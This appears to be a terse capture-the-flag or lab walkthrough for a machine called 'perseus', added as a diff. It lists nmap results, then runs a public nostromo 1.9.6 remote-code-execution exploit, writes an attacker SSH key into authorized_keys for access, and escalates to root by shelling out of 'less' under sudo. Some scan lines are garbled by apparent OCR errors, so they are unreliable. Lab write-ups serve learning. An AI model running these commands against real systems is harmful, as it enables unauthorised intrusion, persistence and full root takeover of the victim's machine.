@@ -1,0 +1,61 @@
+Machine Name - perseus
+
+IP Address - 192.168.xx.200
+
+Not shown: 65527 filtered ports
+
+PORT STATE SERVICE VERSION
+
+21/tcp open’ ftp vsftpd 3.0.3
+
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.8)
+ues <a
+
+| 2048 bS:6d:1a:a4:b6:92:58:cb:a5:bd:56:94:5f:a8:ac:df (RSA)
+| 256 d6:06:73:6b:7c:65:f7:e1:da:72:12:28:60:a6:ce:4e (ECDSA)
+|_ 256 52:a7:d7:6b:¢1:87:57:03:45 :2a:d3:b4:61:86:47:4c (ED25519)
+23/tcp open telnet Linux telnetd
+
+80/tcp open http Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+
+|_http-title: [FreeSMS: Welcome to the FreeSMS Website]
+
+87/tcp open http nostromo 1.9.6
+
+|_http-server-header: nostromo 1.9.6
+
+|_http-title: Powered By Nostromo
+
+1723/tcp closed pptp
+
+2049/tcp open” nfs ceri
+
+3306/tcp closed mysql
+
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux: linux_kernel
+check port 87
+
+google nostromo remote code execution
+
+https: //www.exploit-db.com/exploits/47837
+
+python 47837.py -h
+
+python 47837.py 192.168.xx.200 87 “whoami”
+
+output - jared
+
+ssh-keygen -t rsa
+
+cat /root/.ssh/id_rsa.pub
+
+python 47837.py 192.168.xx.200 87 "mkdir /home/jared/.ssh/"
+python 47837.py 192.168.xx.200 87 "echo ‘your id-rsa key’ > /home/jared/.ssh/authorized_keys"
+ssh jared@192.168.xx. 200
+
+sudo -l 
+
+sudo -u root /bin/less /var/log/messages
+
+:!/bin/bash
